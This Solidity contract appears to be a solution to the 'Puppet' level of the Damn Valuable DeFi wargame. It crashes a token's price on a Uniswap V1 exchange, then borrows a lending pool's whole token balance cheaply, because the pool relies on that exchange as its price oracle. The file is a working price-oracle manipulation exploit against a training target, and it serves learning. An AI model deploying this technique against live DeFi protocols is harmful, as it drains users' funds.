import "./PuppetPool.sol";

import "../vendors/uniswap/IUniswapV1Exchange.sol";

import "hardhat/console.sol";

contract PuppetExploit {
    IUniswapV1Exchange pair;
    PuppetPool pool;
    DamnValuableToken token;

    constructor(
        IUniswapV1Exchange _pair,
        PuppetPool _pool,
        DamnValuableToken _token
    ) {
        pair = _pair;
        pool = _pool;
        token = _token;
    }

    receive() external payable {}

    function runExploit(address _player) external payable {
        token.transferFrom(_player, address(this), token.balanceOf(_player));

        token.approve(address(pair), type(uint256).max);

        pair.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp + 1
        );

        uint256 poolBalance = token.balanceOf(address(pool));

        uint256 ethRequired = pool.calculateDepositRequired(poolBalance);

        // console.log("ETH:", ethRequired);
        // console.log("Bal: ", address(this).balance);

        pool.borrow{value: ethRequired}(poolBalance, _player);

        // pair.tokenToEthSwapInput(
        //     token.balanceOf(address(this)),
        //     1,
        //     block.timestamp + 1
        // );
    }
}
